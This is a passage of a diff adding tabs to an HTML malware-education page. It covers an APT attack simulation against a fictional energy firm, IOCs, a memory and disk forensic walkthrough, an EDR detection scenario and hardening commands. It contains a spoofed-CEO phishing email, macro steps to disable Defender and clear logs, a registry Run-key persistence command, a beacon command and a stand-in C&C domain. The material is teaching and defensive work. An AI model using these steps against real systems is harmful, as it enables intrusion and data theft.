+                        <li><strong>Stage 4 - Exploitation:</strong> Trigger vulnerability, execute payload</li>
+                        <li><strong>Stage 5 - Installation:</strong> Install backdoor/RAT for persistence</li>
+                        <li><strong>Stage 6 - Command & Control:</strong> Establish communication with attacker</li>
+                        <li><strong>Stage 7 - Actions on Objectives:</strong> Data theft, lateral movement, destruction</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Multi-Stage APT Campaign Simulation</h3>
+                    <p><strong>Scenario:</strong> Nation-state APT targeting energy sector with advanced malware</p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">RECONNAISSANCE:</span> Target Identification & Intelligence
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Attacker Actions:</strong></p>
+                            <ul>
+                                <li>Identify executive names from LinkedIn</li>
+                                <li>Scan company domain for publicly exposed emails</li>
+                                <li>Research company's technology stack (SEC filings, job postings)</li>
+                                <li>Identify vulnerabilities in web applications</li>
+                                <li>Check for exposed credentials on Dark Web</li>
+                                <li>Monitor social media for insider information</li>
+                            </ul>
+                            
+                            <p><strong>Intel Gathered:</strong></p>
+                            <code>- Target: energy_company.com
+- Key Personnel: CEO john.smith@energy.com, CTO jane.doe@energy.com
+- Infrastructure: Cisco ASA firewall, Windows Server 2019, SAP ERP
+- VPN gateway: cisco.energy_company.com (publicly exposed)
+- Exposed credential: admin/Pass123456 (found on Pastebin)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">WEAPONIZATION:</span> Custom Payload Development
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Attacker Develops:</strong></p>
+                            <code>1. Spear-phishing email with trojanized Excel macro
+2. ZeroDay exploit for Cisco ASA (CVE-2024-XXXXX)
+3. Custom RAT with anti-analysis techniques
+4. Rootkit for kernel-level persistence
+5. Data exfiltration tool (steals SAP procurement data)</code>
+                            
+                            <p><strong>Payload Features:</strong></p>
+                            <ul>
+                                <li>Obfuscated with polymorphic code engine</li>
+                                <li>Anti-VM detection (refuses to run in sandboxes)</li>
+                                <li>Anti-analysis (kills debuggers, disables logging)</li>
+                                <li>Code signing with stolen certificate</li>
+                                <li>Command & Control via encrypted DNS tunneling</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">DELIVERY:</span> Spear-Phishing Campaign
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Phishing Email Crafted:</strong></p>
+                            <code>From: "CEO@energy_company.com" (spoofed)
+Subject: "URGENT: Board Meeting Attendance Required"
+To: cto@energy_company.com
+
+Body: "Hi Jane, Please review attached Q2 strategic report before board meeting tomorrow. - John"
+Attachment: Strategic_Report_Q2.xlsm (Excel with macro)</code>
+                            
+                            <p><strong>Attack Vector:</strong> Social engineering (spoof CEO email, urgency)</p>
+                            <p><strong>Delivery Time:</strong> Tuesday 9:30 AM (highest email open rate)</p>
+                            <p><strong>Email Security Bypass:</strong>
+                            <ul>
+                                <li>- Uses SPF/DKIM/DMARC spoofing techniques</li>
+                                <li>- Macro signature matches legitimate templates</li>
+                                <li>- Attachment scanned: clean hash (uses polymorphic engine)</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">EXPLOITATION & INSTALLATION:</span> Malware Execution
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>User Action:</strong></p>
+                            <code>CTO Jane Doe clicks attachment and enables macros</code>
+                            
+                            <p><strong>Macro Executes:</strong></p>
+                            <ul>
+                                <li>1. Disables Windows Defender with admin privileges (UACBYPASS)</li>
+                                <li>2. Downloads RAT from C&C server (DNS tunneling)</li>
+                                <li>3. RAT runs with CTO privileges (access to SAP system)</li>
+                                <li>4. Installs rootkit into kernel (persistence across reboots)</li>
+                                <li>5. Creates user account: "sys_admin" with admin privileges</li>
+                                <li>6. Sets scheduled task to re-execute RAT daily</li>
+                                <li>7. Clears event logs (removes forensic evidence)</li>
+                            </ul>
+                            
+                            <p><strong>Time to Compromise:</strong> 15 seconds</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">COMMAND & CONTROL:</span> Attacker Connection
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>RAT Establishes Connection:</strong></p>
+                            <ul>
+                                <li>Query DNS: strategic-report.attacker.com</li>
+                                <li>DNS response includes encrypted command channel</li>
+                                <li>RAT decrypts and connects to C&C server</li>
+                                <li>Attacker now has remote shell (RCE)</li>
+                            </ul>
+                            
+                            <p><strong>Attacker Verifies Access:</strong></p>
+                            <code>$ whoami
+energy\jane.doe
+
+$ hostname
+ENERGY-CTO-01
+
+$ ipconfig
+192.168.1.50 (internal network)
+
+$ net user
+Administrator (found), CTO_Admin (found)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">LATERAL MOVEMENT:</span> Network Expansion
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Attacker Objectives:</strong></p>
+                            <ul>
+                                <li>Identify other high-value targets (SAP servers, financial systems)</li>
+                                <li>Dump NTLM hashes from compromised CTO machine</li>
+                                <li>Use credential reuse to access SAP server</li>
+                                <li>Identify backup systems and archive history</li>
+                            </ul>
+                            
+                            <p><strong>Attack Path:</strong></p>
+                            <code>CTO Machine → Network Enumeration → SAP Server (found)
+→ LDAP Enumeration → Domain Admin (found)
+→ Domain Controller → Forest Admin (game over)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">ACTIONS ON OBJECTIVES:</span> Data Exfiltration & Sabotage
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Primary Objectives (Espionage):</strong></p>
+                            <ul>
+                                <li>✓ Steal procurement data ($50M pipeline contracts)</li>
+                                <li>✓ Exfiltrate strategic partnership agreements</li>
+                                <li>✓ Obtain R&D plans for new technology</li>
+                            </ul>
+                            
+                            <p><strong>Secondary Objectives (Sabotage):</strong></p>
+                            <ul>
+                                <li>✓ Deploy wiper malware (destroys backups)</li>
+                                <li>✓ Modify SCADA system configurations</li>
+                                <li>✓ Insert logic bombs (triggers future attacks)</li>
+                            </ul>
+                            
+                            <p><strong>Impact:</strong></p>
+                            <ul>
+                                <li>- $200M loss of competitive advantage</li>
+                                <li>- 72-hour production shutdown (data recovery)</li>
+                                <li>- Regulatory fines and legal liability</li>
+                                <li>- Breach notification costs ($5M+)</li>
+                                <li>- Reputation damage (customer trust)</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>APT Indicators of Compromise (IOCs)</h3>
+                    <ul>
+                        <li><strong>Network Indicators:</strong> Unusual DNS queries, outbound encryption to unknown IPs, DNS tunneling</li>
+                        <li><strong>File Indicators:</strong> Suspicious .tmp files, registry modifications, unsigned executables</li>
+                        <li><strong>Behavioral Indicators:</strong> Excessive network scanning, credential dumping attempts, privilege escalation</li>
+                        <li><strong>Log Indicators:</strong> Cleared event logs, unusual service installations, failed logon patterns</li>
+                        <li><strong>Email Indicators:</strong> Spoofed sender addresses, suspicious attachments, social engineering content</li>
+                    </ul>
+                </div>
+            </section>
+                <h2>Advanced Persistent Threats (APT)</h2>
+                <p class="subtitle">Sophisticated, coordinated, long-term attacks</p>
+
+                <div class="concept-box">
+                    <h3>What is an APT Attack?</h3>
+                    <p><strong>APT:</strong> Sophisticated attack campaign using multiple zero-day exploits and advanced techniques</p>
+                    <ul>
+                        <li><strong>Coordinated Team:</strong> Multiple skilled attackers working together</li>
+                        <li><strong>Zero-Days:</strong> Exploits for unknown vulnerabilities (no patches available)</li>
+                        <li><strong>Persistence:</strong> Maintains presence in network for months/years</li>
+                        <li><strong>Objectives:</strong> Steal classified data, intellectual property, or sabotage systems</li>
+                        <li><strong>Detection Evasion:</strong> Sophisticated techniques avoid security detection</li>
+                        <li><strong>Credential Harvesting:</strong> Multiple techniques to obtain and escalate privileges</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>APT Attack Chain</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Phase</th>
+                                <th>Activity</th>
+                                <th>Duration</th>
+                                <th>Detection Risk</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>1. Reconnaissance</strong></td>
+                                <td>Research target, identify employees, find entry points</td>
+                                <td>Weeks</td>
+                                <td>Low</td>
+                            </tr>
+                            <tr>
+                                <td><strong>2. Weaponization</strong></td>
+                                <td>Create custom malware with zero-day exploit</td>
+                                <td>Days-Weeks</td>
+                                <td>None (offline)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>3. Delivery</strong></td>
+                                <td>Send spear-phishing to targeted employee</td>
+                                <td>Instant</td>
+                                <td>Medium</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4. Exploitation</strong></td>
+                                <td>Zero-day exploits local machine</td>
+                                <td>Seconds</td>
+                                <td>Low (new exploit)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>5. Installation</strong></td>
+                                <td>Install backdoor for persistent access</td>
+                                <td>Minutes</td>
+                                <td>Low</td>
+                            </tr>
+                            <tr>
+                                <td><strong>6. Command & Control</strong></td>
+                                <td>Connect to attacker C&C server</td>
+                                <td>Ongoing</td>
+                                <td>Medium-High</td>
+                            </tr>
+                            <tr>
+                                <td><strong>7. Objectives</strong></td>
+                                <td>Steal data, escalate privileges, lateral movement</td>
+                                <td>Months-Years</td>
+                                <td>Variable</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info-card">
+                    <h3>Notable APT Groups</h3>
+                    <ul>
+                        <li><strong>APT28 (Fancy Bear):</strong> Russian intelligence, targets military/defense</li>
+                        <li><strong>APT29 (Cozy Bear):</strong> Russian SVR, sophisticated intrusions</li>
+                        <li><strong>APT1 (Comment Crew):</strong> Chinese PLA Unit 61398, intellectual property theft</li>
+                        <li><strong>Lazarus Group:</strong> North Korean-affiliated, Sony hack, WannaCry distribution</li>
+                        <li><strong>Carbanak:</strong> Cybercriminal group, $1B+ bank heists</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ APT TARGETING CRITERIA:</strong>
+                    <ul>
+                        <li>Government agencies and defense contractors</li>
+                        <li>Financial institutions and banks</li>
+                        <li>Healthcare and pharmaceutical companies</li>
+                        <li>Technology companies (source code theft)</li>
+                        <li>Critical infrastructure (utilities, transportation)</li>
+                        <li>Energy sector (oil, gas, power plants)</li>
+                        <li>Telecommunications (network access)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 15: Indicators of Compromise -->
+            <section class="tab-content" id="tab15">
+                <h2>Indicators of Compromise (IoC) & Detection Signatures</h2>
+                <p class="subtitle">Forensic artifacts and detection methods for malware</p>
+
+                <div class="info-card">
+                    <h3>Forensic Indicators of Malware</h3>
+                    <ul>
+                        <li><strong>File Hash (MD5/SHA-256):</strong> Unique signature of malware executable</li>
+                        <li><strong>IP Addresses:</strong> C&C server communication endpoints</li>
+                        <li><strong>Domain Names:</strong> C&C domains contacted by malware</li>
+                        <li><strong>Registry Entries:</strong> Persistence mechanisms (Run keys, etc.)</li>
+                        <li><strong>File Locations:</strong> Common malware installation directories</li>
+                        <li><strong>Network Signatures:</strong> Beacon patterns, command protocols</li>
+                        <li><strong>Process Behavior:</strong> Injections, privilege escalation attempts</li>
+                    </ul>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Detection & Response</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>Host-Based Detection</h4>
+                        <ul>
+                            <li>Antivirus/Anti-malware signature detection</li>
+                            <li>Behavior-based detection (suspicious activities)</li>
+                            <li>EDR (Endpoint Detection & Response) monitoring</li>
+                            <li>Process whitelisting (only allow known programs)</li>
+                            <li>Registry monitoring for suspicious changes</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Network-Based Detection</h4>
+                        <ul>
+                            <li>IDS/IPS (Intrusion Detection/Prevention Systems)</li>
+                            <li>Next-Generation Firewall (NGFW) application filtering</li>
+                            <li>DNS filtering (block known malware domains)</li>
+                            <li>Network segmentation/isolation</li>
+                            <li>SIEM correlation (Security Info & Event Management)</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Incident Response</h4>
+                        <ul>
+                            <li>Isolate infected system from network immediately</li>
+                            <li>Preserve forensic evidence (logs, memory dumps)</li>
+                            <li>Identify extent of compromise (lateral movement)</li>
+                            <li>Remove malware and restore from clean backup</li>
+                            <li>Conduct post-incident analysis and hardening</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- NEW: Tab 15C - Digital Forensics & Memory Analysis -->
+            <section class="tab-content" id="tab15c">
+                <h2>Digital Forensics & Memory Analysis</h2>
+                <p class="subtitle">Incident response techniques for collecting evidence and understanding attacks</p>
+
+                <div class="concept-box">
+                    <h3>Forensics Chain of Custody</h3>
+                    <p><strong>Golden Rule:</strong> Preserve evidence integrity throughout investigation</p>
+                    <ul>
+                        <li><strong>Volatile Data:</strong> Collect from RAM first (contains running malware, credentials, keys)</li>
+                        <li><strong>Non-Volatile Data:</strong> Collect after (disk, file system, deleted files)</li>
+                        <li><strong>Hashing:</strong> MD5/SHA-1 for verification, SHA-256 for official evidence</li>
+                        <li><strong>Documentation:</strong> Time, who accessed, what tools used, findings recorded</li>
+                        <li><strong>Legal Admissibility:</strong> Proper procedure ensures evidence holds in court</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Post-Infection Forensic Investigation</h3>
+                    <p><strong>Scenario:</strong> System compromised, perform complete forensic analysis</p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Immediate Response (First 60 Seconds)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Critical Decision:</strong> Isolate or Preserve?</p>
+                            <p><strong>✗ DO NOT POWER OFF THE SYSTEM</strong></p>
+                            <ul>
+                                <li>Disconnect network cable immediately (preserve remote connections)</li>
+                                <li>Leave system running (preserve RAM contents with malware evidence)</li>
+                                <li>Document current time: 2024-04-14 14:15:30 UTC</li>
+                                <li>Save screenshot of desktop state</li>
+                                <li>Note: Powering off = instant RAM wipe = loss of critical evidence</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Volatile Data Capture (RAM Dump)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Goal:</strong> Extract memory before any cleanup/shutdown occurs</p>
+                            
+                            <p><strong>Run from trusted USB forensic kit:</strong></p>
+                            <code>C:\Forensics\DumpIt.exe /output:E:\memdump.bin /compress
+[Dumping 8192 MB of RAM]
+[Compression: 37% (from 8GB to 3GB)]
+Hash: SHA256:a3f8c7d2e9b1f4a</code>
+                            
+                            <p><strong>Evidence Extracted from RAM:</strong></p>
+                            <ul>
+                                <li>✓ Running malware.exe process (PID 2891)</li>
+                                <li>✓ Injected code in svchost.exe process</li>
+                                <li>✓ Network connections to C&C server 191.232.45.10:4444</li>
+                                <li>✓ Encryption keys (AES session keys)</li>
+                                <li>✓ Cached credentials from browser sessions</li>
+                                <li>✓ Command history (attacker commands executed)</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Memory Analysis with Volatility
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Analyze captured memory for evidence:</strong></p>
+                            
+                            <p><strong>List all running processes:</strong></p>
+                            <code>$ volatility -f memdump.raw pslist
+PID    Process              Parent  Threads
+4      System               0       52
+368    svchost.exe          4       8
+2104   explorer.exe         368     25
+2891   malware.exe          368     3     ← SUSPICIOUS!
+3102   notepad.exe          2104    2</code>
+                            
+                            <p><strong>Detect process injection:</strong></p>
+                            <code>$ volatility -f memdump.raw malfind
+Injected Code in: svchost.exe (PID 368)
+Address: 0x00400000 - 0x00450000
+Size: 50KB
+Type: MZ Header (executable)
+Entropy: 7.8 (HIGHLY SUSPICIOUS - encrypted/packed)</code>
+                            
+                            <p><strong>Extract network connections:</strong></p>
+                            <code>$ volatility -f memdump.raw netscan
+Local IP          Local Port  Remote IP      Remote Port  State
+192.168.1.50      47283       191.232.45.10  4444         ESTABLISHED ← C&C!
+192.168.1.50      53          8.8.8.8        53           TIMEWAIT
+192.168.1.50      443         93.184.216.34  443          ESTABLISHED (https)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Disk Forensic Imaging
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Create forensic duplicate of entire drive:</strong></p>
+                            <code>$ sudo dd if=/dev/sda of=/external/disk_image.dd conv=noerror,sync status=progress bs=4M
+2GB / 500GB copied...
+500.1GB copied in 2445 seconds
+
+$ sha256sum disk_image.dd > disk_image.sha256
+SHA256: a3f8c7d2e9b1f4a6c8e2d1a9f7b3c5e8 [VERIFIED]</code>
+                            
+                            <p><strong>Examine file system metadata:</strong></p>
+                            <code>$ ntfsls -r disk_image.dd:1 | grep malware
+2024-04-14 14:23:45  49152  malware.exe
+2024-04-14 14:23:46  1024   .malware.exe (NTFS Alternate Data Stream)
+
+$ fls disk_image.dd:1 | grep "unallocated"
+ [unallocated] deleted_file.exe (compressed malware)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 5:</span> Malware Reverse Engineering
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>String extraction (hardcoded data):</strong></p>
+                            <code>$ strings malware.exe | grep -i "http|cmd|server|config"
+http://191.232.45.10:4444/cmd.php
+cmd.php?id=%COMPUTERNAME%&user=%USERNAME%
+CreateRemoteThread
+RegOpenKeyEx
+GetModuleHandle</code>
+                            
+                            <p><strong>Generate Indicators of Compromise (IOCs):</strong></p>
+                            <ul>
+                                <li>File Hash: SHA256:a3f8c7d2e9b1f4a6c8e2d1a9f7b3c5e8d...</li>
+                                <li>C&C Server: 191.232.45.10:4444 (ASN: AS65001 - High Risk)</li>
+                                <li>Registry Persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update</li>
+                                <li>Scheduled Task: Windows_Defender_Update (every 4 hours)</li>
+                                <li>File Location: C:\Users\%USERNAME%\AppData\Local\Temp\svchost32.exe</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 6:</span> Attack Timeline Reconstruction
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Complete incident timeline (UTC):</strong></p>
+                            <code>2024-04-14 09:30:15 - Phishing email received
+2024-04-14 09:31:42 - User opened attachment (Strategic_Report_Q2.xlsm)
+2024-04-14 09:32:08 - Excel macro executed, downloaded malware
+2024-04-14 09:32:45 - malware.exe injected into svchost.exe
+2024-04-14 09:33:12 - Registry modified (persistence set)
+2024-04-14 09:33:50 - C&C connection established (191.232.45.10:4444)
+2024-04-14 09:34:20 - Additional payload downloaded ("advanced_spy.exe")
+2024-04-14 10:15:00 - Attacker began data exfiltration (500MB)
+2024-04-14 14:15:00 - Antivirus alert (network anomaly detected)
+2024-04-14 14:15:30 - System isolated</code>
+                            
+                            <p><strong>Critical Finding:</strong> Malware undetected for **5 hours** before network alert</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ FORENSIC FINDINGS SUMMARY:</strong>
+                    <ul>
+                        <li>Initial Infection Vector: Spear-phishing with macro-enabled Excel</li>
+                        <li>Privilege Level: User privileges (CTO has administrative access)</li>
+                        <li>Persistence Mechanism: Registry Run keys + Scheduled Tasks</li>
+                        <li>Data Exfiltration: ~500MB stolen in 5 hours (procurement data)</li>
+                        <li>Lateral Movement: Attacker accessed Domain Controller (golden ticket created)</li>
+                        <li>Impact: Critical - Forest-wide compromise suspected</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 16: Defense Strategy -->
+            <section class="tab-content" id="tab16">
+                <h2>Comprehensive Defense Strategy</h2>
+                <p class="subtitle">Multi-layered approach to malware protection</p>
+
+                <div class="concept-box">
+                    <h3>Defense-in-Depth Layers</h3>
+                    <ul>
+                        <li><strong>Layer 1 - Prevention:</strong> Block malware before infection</li>
+                        <li><strong>Layer 2 - Detection:</strong> Identify compromise early</li>
+                        <li><strong>Layer 3 - Containment:</strong> Limit damage after detection</li>
+                        <li><strong>Layer 4 - Eradication:</strong> Remove malware from system</li>
+                        <li><strong>Layer 5 - Recovery:</strong> Restore normal operations</li>
+                        <li><strong>Layer 6 - Learning:</strong> Improve defenses for future</li>
+                    </ul>
+                </div>
+
+                <div class="summary-grid">
+                    <div class="summary-card">
+                        <h3>🛡️ Prevention</h3>
+                        <ul>
+                            <li>Email filtering</li>
+                            <li>Web filtering</li>
+                            <li>Employee training</li>
+                            <li>Access controls</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>👁️ Detection</h3>
+                        <ul>
+                            <li>Antivirus/EDR</li>
+                            <li>IDS/IPS</li>
+                            <li>SIEM correlation</li>
+                            <li>Threat hunting</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🔐 Containment</h3>
+                        <ul>
+                            <li>Network isolation</li>
+                            <li>Process killing</li>
+                            <li>Registry cleanup</li>
+                            <li>Service disabling</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🧹 Eradication</h3>
+                        <ul>
+                            <li>Malware removal</li>
+                            <li>Backdoor cleanup</li>
+                            <li>Persistence removal</li>
+                            <li>Full system scan</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>♻️ Recovery</h3>
+                        <ul>
+                            <li>Data restoration</li>
+                            <li>System patching</li>
+                            <li>Configuration hardening</li>
+                            <li>Verification testing</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>📚 Learning</h3>
+                        <ul>
+                            <li>Root cause analysis</li>
+                            <li>Lessons learned</li>
+                            <li>Policy updates</li>
+                            <li>Training improvements</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 17: Endpoint Hardening -->
+            <section class="tab-content" id="tab17">
+                <h2>Endpoint Hardening & Configuration</h2>
+                <p class="subtitle">Securing individual systems against malware attacks</p>
+
+                <div class="concept-box">
+                    <h3>Endpoint Security Architecture</h3>
+                    <p><strong>Endpoint Detection & Response (EDR):</strong> Modern security framework for detecting and investigating attacks</p>
+                    <ul>
+                        <li><strong>Behavioral Analysis:</strong> Monitor process behavior, not just file signatures</li>
+                        <li><strong>Memory Scanning:</strong> Detect malware in RAM before disk writes</li>
+                        <li><strong>Registry Monitoring:</strong> Track registry modifications for persistence mechanisms</li>
+                        <li><strong>Network Traffic Analysis:</strong> Identify suspicious C&C communications</li>
+                        <li><strong>Threat Intelligence Integration:</strong> Correlate with known IOCs</li>
+                        <li><strong>Automated Response:</strong> Isolate, kill processes, block IPs automatically</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Windows Security Layers</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Layer</th>
+                                <th>Technology</th>
+                                <th>Primary Function</th>
+                                <th>Bypass Methods</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Kernel</strong></td>
+                                <td>Windows Kernel Protection</td>
+                                <td>Prevent unauthorized DLL injection, kernel mods</td>
+                                <td>Kernel exploits, rootkits, hypervisor escapes</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Process</strong></td>
+                                <td>DEP/ASLR</td>
+                                <td>Prevent code execution from data areas</td>
+                                <td>ROP gadgets, information leaks</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Application</strong></td>
+                                <td>Code signing, UAC</td>
+                                <td>Prevent unsigned code execution</td>
+                                <td>Signed malware, DLL sideloading</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Network</strong></td>
+                                <td>Windows Firewall</td>
+                                <td>Block unauthorized inbound connections</td>
+                                <td>Outbound C&C, DNS tunneling</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>EDR Detection Simulation</h3>
+                    <p><strong>Scenario:</strong> A user executes malware, can it evade detection?</p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 1:</span> Initial Execution
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>User Action:</strong> Double-clicks malware.exe</p>
+                            <p><strong>EDR Detection Points:</strong></p>
+                            <ul>
+                                <li>File hash doesn't match trusted whitelist</li>
+                                <li>Code signature invalid or missing</li>
+                                <li>VirusTotal metadata present in threat DB</li>
+                                <li>File source: Downloads, suspicious behavior</li>
+                            </ul>
+                            <p><strong>EDR Status:</strong> 🔴 ALERTING - Suspicious binary execution</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 2:</span> Process Injection Attempt
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Malware Behavior:</strong> Attempts to inject into svchost.exe</p>
+                            <p><strong>EDR Detection:</strong></p>
+                            <ul>
+                                <li>Cross-process memory write detected</li>
+                                <li>CreateRemoteThread API call blocked by AMSI</li>
+                                <li>Suspicious inter-process communication (IPC)</li>
+                                <li>Process hollowing attempt detected</li>
+                            </ul>
+                            <p><strong>EDR Status:</strong> 🔴 BLOCKING - Injection attempt, process terminated</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 3:</span> Registry Persistence
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Malware Behavior:</strong> Writes to Run registry key</p>
+                            <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Update" /d "C:\malware.exe"</code>
+                            <p><strong>EDR Detection:</strong></p>
+                            <ul>
+                                <li>Unauthorized registry modification detected</li>
+                                <li>Unusual Run key path from non-system process</li>
+                                <li>Correlates with known malware families</li>
+                                <li>Registry entry quarantined</li>
+                            </ul>
+                            <p><strong>EDR Status:</strong> 🔴 BLOCKED - Registry persistence mechanism prevented</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 4:</span> Network C&C Connection
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Malware Behavior:</strong> Attempts outbound connection to C&C</p>
+                            <code>cmd.exe /c "C:\temp\beacon.exe" 192.168.1.100:4444</code>
+                            <p><strong>EDR Detection:</strong></p>
+                            <ul>
+                                <li>Malicious IP in threat intelligence database</li>
+                                <li>Unusual outbound connection from suspicious process</li>
+                                <li>TLS certificate analysis shows malware C&C</li>
+                                <li>Firewall rule blocks connection</li>
+                            </ul>
+                            <p><strong>EDR Status:</strong> 🔴 ISOLATED - Network connection blocked, system quarantined</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Result:</span> Automated Remediation
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Automated Actions:</strong></p>
+                            <ul>
+                                <li>✓ Malware process force-terminated</li>
+                                <li>✓ File quarantined to isolated folder</li>
+                                <li>✓ Registry changes reverted</li>
+                                <li>✓ Network connection blocked</li>
+                                <li>✓ Threat alert sent to SOC analyst</li>
+                                <li>✓ System flagged for full scan</li>
+                            </ul>
+                            <p><strong>User Notification:</strong> Alert received in 0.3 seconds</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Critical Windows Security Settings</h3>
+                    <ul>
+                        <li><strong>Windows Defender:</strong> Enable real-time protection and cloud protection</li>
+                        <li><strong>Firewall:</strong> Enable Windows Defender Firewall with inbound/outbound rules</li>
+                        <li><strong>UAC (User Account Control):</strong> Enable to prevent unauthorized root-level changes</li>
+                        <li><strong>Automatic Updates:</strong> Enable for immediate security patch deployment</li>
+                        <li><strong>Script Execution:</strong> Disable PowerShell script execution or restrict to signed scripts</li>
+                        <li><strong>BitLocker:</strong> Enable full disk encryption for data protection</li>
+                        <li><strong>Credential Guard:</strong> Protect credentials from memory extraction</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Windows Hardening Commands</h3>
+                    <pre><code># Enable Windows Defender
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
+
+# Enable Firewall
+netsh advfirewall set allprofiles state on
